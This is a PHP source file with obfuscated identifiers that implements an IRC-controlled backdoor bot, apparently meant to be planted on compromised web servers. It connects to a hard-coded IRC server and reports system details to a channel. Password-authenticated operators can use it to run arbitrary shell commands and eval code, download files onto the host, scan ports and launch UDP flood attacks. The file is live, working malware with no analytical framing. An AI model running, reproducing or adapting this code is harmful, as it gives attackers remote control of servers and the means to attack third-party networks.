<?php set_time_limit(0); error_reporting(0);  class nNQEEhKnZQBzTebbt {

 /* u8UklpYz4wqIaA6BaYnDcohLElXLUKheJ1pVhdkbABKB1G32vgwxvD90OWBzxJE7BTSIX2KnukP */

 var $qHTnBEztZnWbkKq = array("WzWzHENEwnenteqK"=>"gang.sexpil.net",
                     "tWBH"=>"25343",
                     "wheNe"=>"scary",
                     "tKhBww"=>"13",
                     "zTqZzWK"=>"#wWw#",
                     "etW"=>"scan",
                     "hEnnWWEQz"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "nnEtbKKNQn"=>".",
                     "hnKbEHBzqEQ"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $users = array(); 

 /* 0zBlSGusE0QAcHfHNWd2YvRt0qNS4jHUJ95rFqJ9hpAjXFQAsTthfaA5reOlnl6Xk2eQiOPp4gy */ function JJJpYSVVvaj($to,$msg)
 {
    $this->YymgPvm("PRIVMSG $to :$msg");
 } function AdDJSsagGJvmGpjpV() {
  $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $size = strlen($chars);
  for($i=0;$i<6;$i++) {
	$str .= $chars[rand(0,$size-1)];
  }
  if(php_uname() == "") { $uname = "---"; } else { $uname = php_uname(); }
  $this->YymgPvm("USER ".$str."-gc 127.0.0.1 localhost :".$uname."");
 } function GyPMjggMdsPpdJPgmA($host,$packetsize,$time) {
	$this->JJJpYSVVvaj($this->qHTnBEztZnWbkKq['zTqZzWK'],"[\2UdpFlood Started!\2]"); 
	$packet = "";
	for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
	$timei = time();
	$i = 0;
	while(time()-$timei < $time) {
		$fp=fsockopen("udp://".$host,mt_rand(0,6000),$e,$s,5);
      	fwrite($fp,$packet);
       	fclose($fp);
		$i++;
	}
	$env = $i * $packetsize;
	$env = $env / 1048576;
	$vel = $env / $time;
	$vel = round($vel);
	$env = round($env);
	$this->JJJpYSVVvaj($this->qHTnBEztZnWbkKq['zTqZzWK'],"[\2UdpFlood Finished!\2]: $env MB enviados / Media: $vel MB/s ");
 } function aDAjmmDAVSMmPsMDdYM() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "\0034ON\003"; }
    else { $safemode = "\0039OFF\003"; }

	$unme = php_uname();
	if($unme == "") { $mname = "\00315---\003"; }
	else { $mname = "\00315".$unme."\003"; }
		 
	 $url = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 $pth = "\00315".getcwd()."\003";
		  
	$pthh =  getcwd()."";
	$ofiOCuuuOO = fileperms("$pthh");

	if (($ofiOCuuuOO & 0xC000) == 0xC000) { $xilUOrOiUCR = 's';
	} elseif (($ofiOCuuuOO & 0xA000) == 0xA000) { $xilUOrOiUCR = 'l';
	} elseif (($ofiOCuuuOO & 0x8000) == 0x8000) { $xilUOrOiUCR = '-';
	} elseif (($ofiOCuuuOO & 0x6000) == 0x6000) { $xilUOrOiUCR = 'b';
	} elseif (($ofiOCuuuOO & 0x4000) == 0x4000) { $xilUOrOiUCR = 'd';
	} elseif (($ofiOCuuuOO & 0x2000) == 0x2000) { $xilUOrOiUCR = 'c';
	} elseif (($ofiOCuuuOO & 0x1000) == 0x1000) { $xilUOrOiUCR = 'p';
	} else { $xilUOrOiUCR = 'u'; }

	// Owner
	$xilUOrOiUCR .= (($ofiOCuuuOO & 0x0100) ? 'r' : '-');
	$xilUOrOiUCR .= (($ofiOCuuuOO & 0x0080) ? 'w' : '-');
	$xilUOrOiUCR .= (($ofiOCuuuOO & 0x0040) ?	(($ofiOCuuuOO & 0x0800) ? 's' : 'x' ) :	(($ofiOCuuuOO & 0x0800) ? 'S' : '-'));
	// Group
	$xilUOrOiUCR .= (($ofiOCuuuOO & 0x0020) ? 'r' : '-');
	$xilUOrOiUCR .= (($ofiOCuuuOO & 0x0010) ? 'w' : '-');
	$xilUOrOiUCR .= (($ofiOCuuuOO & 0x0008) ?	(($ofiOCuuuOO & 0x0400) ? 's' : 'x' ) :	(($ofiOCuuuOO & 0x0400) ? 'S' : '-'));
	// World
	$xilUOrOiUCR .= (($ofiOCuuuOO & 0x0004) ? 'r' : '-');
	$xilUOrOiUCR .= (($ofiOCuuuOO & 0x0002) ? 'w' : '-');
	$xilUOrOiUCR .= (($ofiOCuuuOO & 0x0001) ?	(($ofiOCuuuOO & 0x0200) ? 't' : 'x' ) :	(($ofiOCuuuOO & 0x0200) ? 'T' : '-'));
			
	$rghts = "\00315".$xilUOrOiUCR."\003";

	$this->JJJpYSVVvaj($this->qHTnBEztZnWbkKq['zTqZzWK'],"\00314[SAFE:\003\2 $safemode\2\00314]\00315 $url \00314[pwd:]\00315 $pth \00314(\003$rghts\00314) [uname:]\00315 $mname");
 } function GGvgSgMsvAYjdmJS() {
  $chars = 'abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ-0123456789';	
  $size = strlen($chars);
  for($i=0;$i<$this->qHTnBEztZnWbkKq['tKhBww'];$i++) {
	$str .= $chars[rand(0,$size-1)];
  }
  $this->YymgPvm("NICK ".$str."");
 } function ppJpGVSV($host) 
 { 
    unset($this->users[$host]); 
 } function dpAmgA($chan,$key=NULL) 
 { 
    $this->YymgPvm("JOIN $chan $key"); 
 } function YymgPvm($msg) 
 { 
    fwrite($this->lOixoFFfx,"$msg\r\n"); 
 } function yyjMDymPGPAp($host) 
 { 
    if(isset($this->users[$host])) 
       return 1; 
    else 
       return 0; 
 } function yApYsmDpJP($to,$msg)
 {
    $this->YymgPvm("NOTICE $to :$msg");
 }function pjGYDgmaygAPVD() 
 { 
    while(!feof($this->lOixoFFfx)) 
    { 
       $this->buf = trim(fgets($this->lOixoFFfx,512)); 
       $nNwzZqwBhTQwz = explode(" ",$this->buf); 
       if(substr($this->buf,0,6)=="PING :") 
       { 
          $this->YymgPvm("PONG :".substr($this->buf,6)); 
       } 
       if(isset($nNwzZqwBhTQwz[1]) && $nNwzZqwBhTQwz[1] =="004") 
       { 
          $this->YymgPvm("MODE ".$this->nick." ".$this->qHTnBEztZnWbkKq['']); 
          $this->YymgPvm("JOIN ".$this->qHTnBEztZnWbkKq['zTqZzWK']." ".$this->qHTnBEztZnWbkKq['etW']."");
          $this->dpAmgA($this->qHTnBEztZnWbkKq['zTqZzWK'],$this->qHTnBEztZnWbkKq['etW']);
          $this->aDAjmmDAVSMmPsMDdYM();
       } 
       if(isset($nNwzZqwBhTQwz[1]) && $nNwzZqwBhTQwz[1]=="433") 
       { 
          $this->GGvgSgMsvAYjdmJS(); 
       } 
	/* YjNvFhzRweAEauVhHKfOddJ7Eto0uS2i2GExO3fa8FF80rfy2ld5oM2T6hJr0CAS84gNXlOVRjU */
       if($this->buf != $old_buf) 
       { 
          $hzkQkZbtnKtQtW = array(); 
          $oLx = substr(strstr($this->buf," :"),2); 
          $fXlC = explode(" ",$oLx); 
          $uiRRL = explode("!",$nNwzZqwBhTQwz[0]); 
          $XLxulF = explode("@",$uiRRL[1]); 
          $XLxulF = $XLxulF[1]; 
          $uiRRL = substr($uiRRL[0],1); 
          $Ruufuux = $nNwzZqwBhTQwz[0]; 
          if($fXlC[0]==$this->uiRRL) 
          { 
           for($i=0;$i<count($fXlC);$i++) 
              $hzkQkZbtnKtQtW[$i] = $fXlC[$i+1]; 
          } 
          else 
          { 
           for($i=0;$i<count($fXlC);$i++) 
              $hzkQkZbtnKtQtW[$i] = $fXlC[$i]; 
          } 
          if(count($nNwzZqwBhTQwz)>2) 
          { 
             switch($nNwzZqwBhTQwz[1]) 
             { 
                case "QUIT": 
                   if($this->yyjMDymPGPAp($Ruufuux)) 
                   { 
                      $this->ppJpGVSV($Ruufuux); 
                   } 
                break; 
                case "PART": 
                   if($this->yyjMDymPGPAp($Ruufuux)) 
                   { 
                      $this->ppJpGVSV($Ruufuux); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->yyjMDymPGPAp($Ruufuux) && (md5($XLxulF) == $this->qHTnBEztZnWbkKq['hnKbEHBzqEQ'] || $this->qHTnBEztZnWbkKq['hnKbEHBzqEQ'] == "*")) 
                   { 
                      if(substr($hzkQkZbtnKtQtW[0],0,1)==$this->qHTnBEztZnWbkKq['nnEtbKKNQn']) 
                      { 
                         switch(substr($hzkQkZbtnKtQtW[0],1)) 
                         { 
                            case "user": 
                              if(md5($hzkQkZbtnKtQtW[1])==$this->qHTnBEztZnWbkKq['hEnnWWEQz']) 
                              { 
                                 $this->yPmsJjPMs($Ruufuux);
                              } 
                              else 
                              { 
                                 $this->yApYsmDpJP($this->qHTnBEztZnWbkKq['zTqZzWK'],"[\2Auth\2]: Foute password $uiRRL idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   } 
		     /* HA05sb8oqLg9IoJZfbqXak4N8frUWBEu2uqlwozM0GLyUlo0nENnPI1NOjxBK2VCnbOJqdlgJXF */
                   elseif($this->yyjMDymPGPAp($Ruufuux)) 
                   { 
                      if(substr($hzkQkZbtnKtQtW[0],0,1)==$this->qHTnBEztZnWbkKq['nnEtbKKNQn']) 
                      { 
                         switch(substr($hzkQkZbtnKtQtW[0],1)) 
                         {                            case "sexec":
                               $command = substr(strstr($oLx,$hzkQkZbtnKtQtW[0]),strlen($hzkQkZbtnKtQtW[0])+1); 
                               $exec = shell_exec($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->JJJpYSVVvaj($this->qHTnBEztZnWbkKq['zTqZzWK'],"      : ".trim($ret[$i])); 
			    break;                            case "exec": 
                               $command = substr(strstr($oLx,$hzkQkZbtnKtQtW[0]),strlen($hzkQkZbtnKtQtW[0])+1); 
                               $exec = exec($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->JJJpYSVVvaj($this->qHTnBEztZnWbkKq['zTqZzWK'],"      : ".trim($ret[$i])); 
			    break;                            case "logout": 
                               $this->ppJpGVSV($Ruufuux); 
                               $this->JJJpYSVVvaj($this->qHTnBEztZnWbkKq['zTqZzWK'],"[auth:]\00314 Je bent nu uitgelogt $uiRRL"); 
			    break;                            case "eval":
                              $eval = eval(substr(strstr($oLx,$hzkQkZbtnKtQtW[1]),strlen($hzkQkZbtnKtQtW[1])));
			    break;                            case "raw":
                               $this->YymgPvm(strstr($oLx,$hzkQkZbtnKtQtW[1])); 
			    break;                            case "download": 
                               if(count($hzkQkZbtnKtQtW) > 2) 
                               { 
                                  if(!$fp = fopen($hzkQkZbtnKtQtW[2],"w")) 
                                  {  
                                     $this->JJJpYSVVvaj($this->qHTnBEztZnWbkKq['zTqZzWK'],"[download:]\00314 Kon bestand niet downloaden. Toestemming geweigerd."); 
                                  } 
                                  else 
                                  { 
                                     if(!$get = file($hzkQkZbtnKtQtW[1])) 
                                     { 
                                        $this->JJJpYSVVvaj($this->qHTnBEztZnWbkKq['zTqZzWK'],"[download:]\00314 Kan bestand \2".$hzkQkZbtnKtQtW[1]."\2 niet downloaden."); 
                                     } 
                                     else 
                                     { 
                                        for($i=0;$i<=count($get);$i++) 
                                        { 
                                           fwrite($fp,$get[$i]); 
                                        } 
                                        $this->JJJpYSVVvaj($this->qHTnBEztZnWbkKq['zTqZzWK'],"[download:]\00314 Bestand \2".$hzkQkZbtnKtQtW[1]."\2 gedownload naar \2".$hzkQkZbtnKtQtW[2]."\2"); 
                                     } 
                                     fclose($fp); 
                                  } 
                               }
                               else { $this->JJJpYSVVvaj($this->qHTnBEztZnWbkKq['zTqZzWK'],"[download:]\00314 Typ \".download http://your.host/file /tmp/file\""); }
			    break;                            case "dns": 
                               if(isset($hzkQkZbtnKtQtW[1])) 
                               { 
                                  $ip = explode(".",$hzkQkZbtnKtQtW[1]); 
                                  if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3])) 
                                  { 
                                     $this->JJJpYSVVvaj($this->qHTnBEztZnWbkKq['zTqZzWK'],"[\2dns\2]: ".$hzkQkZbtnKtQtW[1]." => ".gethostbyaddr($hzkQkZbtnKtQtW[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->JJJpYSVVvaj($this->qHTnBEztZnWbkKq['zTqZzWK'],"[\2dns\2]: ".$hzkQkZbtnKtQtW[1]." => ".gethostbyname($hzkQkZbtnKtQtW[1])); 
                                  } 
                               } 
			    break;                            case "popen": 
                               if(isset($hzkQkZbtnKtQtW[1])) 
                               { 
                                  $command = substr(strstr($oLx,$hzkQkZbtnKtQtW[0]),strlen($hzkQkZbtnKtQtW[0])+1); 
                                  $this->JJJpYSVVvaj($this->qHTnBEztZnWbkKq['zTqZzWK'],"[\2popen\2]: $command");
                                  $pipe = popen($command,"r"); 
                                  while(!feof($pipe)) 
                                  { 
                                     $pbuf = trim(fgets($pipe,512)); 
                                     if($pbuf != NULL) 
                                        $this->JJJpYSVVvaj($this->qHTnBEztZnWbkKq['zTqZzWK'],"     : $pbuf"); 
                                  } 
                                  pclose($pipe); 
                               }  
			    break;                            case "die": 
                               $this->YymgPvm("QUIT :die command from $uiRRL");
                               fclose($this->lOixoFFfx); 
                               exit;                            case "restart": 
                               $this->YymgPvm("QUIT :gerestart door $uiRRL");
                               fclose($this->lOixoFFfx); 
                               $this->pgdpSmgSayAgD(); 
			    break;                            case "passthru": 
                               $command = substr(strstr($oLx,$hzkQkZbtnKtQtW[0]),strlen($hzkQkZbtnKtQtW[0])+1); 

                               $exec = passthru($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->JJJpYSVVvaj($this->qHTnBEztZnWbkKq['zTqZzWK'],"      : ".trim($ret[$i])); 
			    break;                            case "udpflood": 
                               if(count($hzkQkZbtnKtQtW)>3) 
                               { 
                                  $this->GyPMjggMdsPpdJPgmA($hzkQkZbtnKtQtW[1],$hzkQkZbtnKtQtW[2],$hzkQkZbtnKtQtW[3]); 
                               } 
			    break;                            case "pscan": 
                               if(count($hzkQkZbtnKtQtW) > 2) 
                               { 
                                  if(fsockopen($hzkQkZbtnKtQtW[1],$hzkQkZbtnKtQtW[2],$e,$s,15)) 
                                     $this->JJJpYSVVvaj($this->qHTnBEztZnWbkKq['zTqZzWK'],"[\2pscan\2]: ".$hzkQkZbtnKtQtW[1].":".$hzkQkZbtnKtQtW[2]." is \2open\2"); 
                                  else 
                                     $this->JJJpYSVVvaj($this->qHTnBEztZnWbkKq['zTqZzWK'],"[\2pscan\2]: ".$hzkQkZbtnKtQtW[1].":".$hzkQkZbtnKtQtW[2]." is \2closed\2"); 
                               } 
			    break;                            case "info":
				   $this->aDAjmmDAVSMmPsMDdYM();
			    break;                            case "rndnick": 
                               $this->GGvgSgMsvAYjdmJS(); 
			    break;                            case "system": 
                               $command = substr(strstr($oLx,$hzkQkZbtnKtQtW[0]),strlen($hzkQkZbtnKtQtW[0])+1); 
                               $exec = system($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->JJJpYSVVvaj($this->qHTnBEztZnWbkKq['zTqZzWK'],"      : ".trim($ret[$i])); 
			    break;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $old_buf = $this->buf; 
    } 
    $this->pgdpSmgSayAgD(); 
 } function yPmsJjPMs($host) 
 { 
    $this->users[$host] = true; 
 } function pgdpSmgSayAgD() 
 { 
    if(!($this->lOixoFFfx = fsockopen($this->qHTnBEztZnWbkKq['WzWzHENEwnenteqK'],$this->qHTnBEztZnWbkKq['tWBH'],$e,$s,30))) 
    $this->pgdpSmgSayAgD(); 
    $this->AdDJSsagGJvmGpjpV();
    if(strlen($this->qHTnBEztZnWbkKq['wheNe'])>0) 
    $this->YymgPvm("PASS ".$this->qHTnBEztZnWbkKq['wheNe']);
    $this->GGvgSgMsvAYjdmJS();
    $this->pjGYDgmaygAPVD();
 }

 /* RLfi4ZCb4CBZUGD6TP2H0ULG3qmjksH13NaYCCZw5qmPXQLGvEemoPSh54rgmZ8gC844AUrwbDb */}
$FiRuCLLl = new nNQEEhKnZQBzTebbt;
$FiRuCLLl->pgdpSmgSayAgD(); ?>